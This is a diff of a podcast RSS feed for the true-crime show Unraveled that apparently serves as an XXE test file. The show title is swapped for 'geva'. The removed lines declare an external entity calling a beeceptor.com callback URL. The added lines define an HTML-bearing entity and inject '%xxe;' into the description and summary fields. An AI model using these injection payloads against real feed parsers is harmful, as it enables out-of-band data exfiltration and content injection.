@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "https://awfawg.free.beeceptor.com/xgevakun" > %xxe; ]>
+<!ENTITY xxe SYSTEM "<b>gevakun</b>" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:media="http://search.yahoo.com/mrss/" xmlns:acast="https://schema.acast.com/1.0/" xmlns:podaccess="https://schema-access.acast.com/1.0/" xmlns:pingback="https://podping.info/specification/1">
     <channel>
         <title>geva</title>
-	    <description><![CDATA[<p>gevakun is hosted by journalists Billy Jensen and Alexis Linkletter. Each season features a deep dive investigation into a case or issue that true crime fans will be obsessed with, culminating in a special streaming on discovery+. &nbsp; </p><p><br></p><p>Season 3, “Unraveled: Experts on Trial” investigates an alarming problem within the American criminal justice process: the business of forensic experts. It is a crisis in the courts that is decades in the making. Citing several cases as examples, Alexis Linkletter and Billy Jensen expose serious flaws with forensic expert testimony that routinely leads to tragedy and injustice within the U.S. court system.&nbsp;</p><p><br></p><p>To follow the Unraveled investigations even further, stream the specials exclusively on discovery+. Go to discoveryplus.com/unraveled to start your 7-day free trial today.*</p><p>&nbsp;</p><p>*discovery+ is currently only available for US subscribers.</p>]]></description>
+	    <description><![CDATA[<p>%xxe; is hosted by journalists Billy Jensen and Alexis Linkletter. Each season features a deep dive investigation into a case or issue that true crime fans will be obsessed with, culminating in a special streaming on discovery+. &nbsp; </p><p><br></p><p>Season 3, “Unraveled: Experts on Trial” investigates an alarming problem within the American criminal justice process: the business of forensic experts. It is a crisis in the courts that is decades in the making. Citing several cases as examples, Alexis Linkletter and Billy Jensen expose serious flaws with forensic expert testimony that routinely leads to tragedy and injustice within the U.S. court system.&nbsp;</p><p><br></p><p>To follow the Unraveled investigations even further, stream the specials exclusively on discovery+. Go to discoveryplus.com/unraveled to start your 7-day free trial today.*</p><p>&nbsp;</p><p>*discovery+ is currently only available for US subscribers.</p>]]></description>
         <acast:showId>5ea17537-f11f-4532-8202-294d976b9d5c</acast:showId>
         <acast:showUrl>unraveled</acast:showUrl>
         <link>https://www.discoveryplus.com</link>
@@ -32,7 +32,7 @@
         <itunes:subtitle><![CDATA[&quot;Unraveled: The Stalker&apos;s Web&quot; tracks the multi-decade wrath of one of the most prolific stalkers to ever prowl the cyberworld. Co-hosts Alexis Linkletter and Billy Jensen investigate his trail of destruction to unmask this deadly threat.]]></itunes:subtitle>
         <itunes:type>serial</itunes:type>
         <itunes:author>discovery+</itunes:author>
-        <itunes:summary>Unraveled is hosted by journalists Billy Jensen and Alexis Linkletter. Each season features a deep dive investigation into a case or issue that true crime fans will be obsessed with, culminating in a special streaming on discovery+. &amp;nbsp; 
+        <itunes:summary>%xxe; is hosted by journalists Billy Jensen and Alexis Linkletter. Each season features a deep dive investigation into a case or issue that true crime fans will be obsessed with, culminating in a special streaming on discovery+. &amp;nbsp; 
 
 
 Season 3, “Unraveled: Experts on Trial” investigates an alarming problem within the American criminal justice process: the business of forensic experts. It is a crisis in the courts that is decades in the making. Citing several cases as examples, Alexis Linkletter and Billy Jensen expose serious flaws with forensic expert testimony that routinely leads to tragedy and injustice within the U.S. court system.&amp;nbsp;
